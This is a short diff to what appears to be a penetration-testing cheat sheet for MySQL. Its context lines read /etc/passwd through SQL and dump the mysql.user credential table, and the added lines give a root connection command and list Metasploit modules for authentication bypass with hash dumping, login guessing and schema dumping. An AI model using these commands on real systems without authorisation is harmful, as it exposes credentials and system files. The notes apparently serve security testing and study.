@@ -11,3 +11,17 @@ select LOAD_FILE('/etc/passwd');
 
 # To get Database credentials
 select * from mysql.user;
+
+
+# Connect to a database
+mysql --host=192.168.1.10 -u root -p
+
+# Metasploit Modules
+
+auxiliary/scanner/mysql/mysql_authbypass_hashdump
+auxiliary/scanner/mysql/mysql_login
+auxiliary/scanner/mysql/mysql_schemadump
+auxiliary/scanner/mysql/mysql_version
+auxiliary/scanner/mysql/mysql_writable_dirs
+
+
